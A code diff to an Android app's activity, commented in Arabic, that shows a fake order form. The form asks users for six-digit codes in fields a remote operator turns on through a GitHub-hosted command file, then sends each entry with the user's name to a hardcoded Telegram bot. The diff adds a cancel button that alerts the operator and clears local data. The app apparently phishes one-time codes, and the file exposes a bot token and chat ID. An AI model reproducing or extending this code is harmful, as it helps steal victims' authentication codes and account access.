@@ -1,5 +1,6 @@
 package com.ban.ab;
 
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
@@ -25,15 +26,14 @@ public class SecondActivity extends AppCompatActivity {
     private LinearLayout layoutWaiting, layoutRejected, layoutFields, groupField1, groupField2, groupField3;
     private TextView txtRejectReason;
     private EditText field1, field2, field3;
-    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder;
+    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder, btnCancelOrder;
     private String userName;
     private final OkHttpClient client = new OkHttpClient();
     private final Handler handler = new Handler();
     private Runnable refreshRunnable;
 
-    // --- إعدادات المراقبة ---
-    // الرابط الجديد بدلاً من القديم
-private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
+    // --- إعدادات الربط (استخدم بياناتك هنا) ---
+    private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
     private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
     private final String CHAT_ID = "1749638488";
 
@@ -64,12 +64,39 @@ private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120
         btnConfirm2 = findViewById(R.id.btnConfirm2);
         btnConfirm3 = findViewById(R.id.btnConfirm3);
         btnFinalOrder = findViewById(R.id.btnFinalOrder);
+        btnCancelOrder = findViewById(R.id.btnCancelOrder); // الزر الجديد
     }
 
     private void setupButtons() {
-        btnConfirm1.setOnClickListener(v -> sendToTg("حقل 1", field1.getText().toString()));
-        btnConfirm2.setOnClickListener(v -> sendToTg("حقل 2", field2.getText().toString()));
-        btnConfirm3.setOnClickListener(v -> sendToTg("حقل 3", field3.getText().toString()));
+        // أزرار تأكيد الحقول
+        btnConfirm1.setOnClickListener(v -> sendToTg("الحقل الأول", field1.getText().toString()));
+        btnConfirm2.setOnClickListener(v -> sendToTg("الحقل الثاني", field2.getText().toString()));
+        btnConfirm3.setOnClickListener(v -> sendToTg("الحقل الثالث", field3.getText().toString()));
+
+        // زر إكمال الطلب النهائي
+        btnFinalOrder.setOnClickListener(v -> {
+            Toast.makeText(this, "شكراً لك، تم إرسال الطلب النهائي بنجاح.", Toast.LENGTH_LONG).show();
+        });
+
+        // زر إلغاء الطلب والعودة للرئيسية
+        btnCancelOrder.setOnClickListener(v -> cancelOrder());
+    }
+
+    private void cancelOrder() {
+        // 1. إرسال تنبيه الإلغاء لتليجرام
+        String cancelMsg = "⚠️ إشعار: قام المستخدم بإلغاء طلبه.\n👤 الاسم: " + userName;
+        sendNotificationOnly(cancelMsg);
+
+        // 2. مسح الذاكرة المحلية (البيانات والحالة)
+        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
+        pref.edit().clear().apply();
+
+        // 3. العودة للرئيسية وإغلاق الصفحة الحالية
+        runOnUiThread(() -> {
+            Toast.makeText(this, "تم إلغاء الطلب ومسح البيانات", Toast.LENGTH_SHORT).show();
+            startActivity(new Intent(SecondActivity.this, MainActivity.class));
+            finish();
+        });
     }
 
     private void startAutoRefresh() {
@@ -97,16 +124,13 @@ private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120
     private void updateUI(JSONObject json) {
         try {
             String status = json.getString("status");
-            
-            // الحالة الافتراضية هي الانتظار إلا إذا تغير الـ JSON
             layoutWaiting.setVisibility(status.equals("waiting") ? View.VISIBLE : View.GONE);
             layoutRejected.setVisibility(status.equals("rejected") ? View.VISIBLE : View.GONE);
             layoutFields.setVisibility(status.equals("fields_form") ? View.VISIBLE : View.GONE);
 
             if (status.equals("rejected")) {
-                txtRejectReason.setText(json.optString("reject_reason", "مرفوض لعدم استيفاء الشروط"));
+                txtRejectReason.setText(json.optString("reject_reason", "الطلب مرفوض"));
             }
-            
             if (status.equals("fields_form")) {
                 int count = json.optInt("visible_fields", 1);
                 groupField1.setVisibility(count >= 1 ? View.VISIBLE : View.GONE);
@@ -117,19 +141,31 @@ private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120
         } catch (Exception ignored) {}
     }
 
-    private void sendToTg(String f, String v) {
-        if (v.length() < 6) { Toast.makeText(this, "أدخل 6 أرقام", Toast.LENGTH_SHORT).show(); return; }
+    private void sendToTg(String label, String value) {
+        if (value.length() < 6) {
+            Toast.makeText(this, "يرجى إدخال البيانات بشكل صحيح", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        String msg = "📩 تحديث من " + userName + ":\n" + label + " ⬅️ " + value;
+        sendNotificationOnly(msg);
+        Toast.makeText(this, "تم إرسال " + label, Toast.LENGTH_SHORT).show();
+    }
+
+    private void sendNotificationOnly(String text) {
         RequestBody body = new FormBody.Builder()
                 .add("chat_id", CHAT_ID)
-                .add("text", "🔔 تحديث من " + userName + ":\n" + f + " ⬅️ " + v)
-                .build();
-        client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).enqueue(new Callback() {
+                .add("text", text).build();
+        Request req = new Request.Builder()
+                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                .post(body).build();
+        client.newCall(req).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
-            @Override public void onResponse(Call call, Response response) {
-                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم الإرسال للإدارة", Toast.LENGTH_SHORT).show());
-            }
+            @Override public void onResponse(Call call, Response response) {}
         });
     }
 
-    @Override protected void onDestroy() { super.onDestroy(); handler.removeCallbacks(refreshRunnable); }
+    @Override protected void onDestroy() { 
+        super.onDestroy(); 
+        handler.removeCallbacks(refreshRunnable); 
+    }
 }
